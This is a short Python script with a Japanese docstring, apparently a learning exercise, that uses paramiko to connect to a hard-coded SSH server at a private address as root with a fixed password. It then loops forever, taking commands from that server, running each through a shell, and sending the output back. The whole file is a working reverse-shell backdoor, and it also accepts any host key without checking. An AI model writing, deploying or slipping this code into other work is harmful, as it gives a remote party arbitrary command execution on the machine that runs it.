"""
独自に作ったSSHサーバーからSSHクライアントにコマンド送るようにする
"""
import paramiko
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            # SSHServerからコマンド受け取り
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.run(
                    command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
                )
                ssh_session.send(cmd_output.stdout)
            except Exception as e:
                ssh_session.send(e)
        client.close()
    return


def main():
    ssh_command('172.17.0.2', 9999, 'root', 'screencast', 'ClientConnected')

if __name__ == '__main__':
    main()
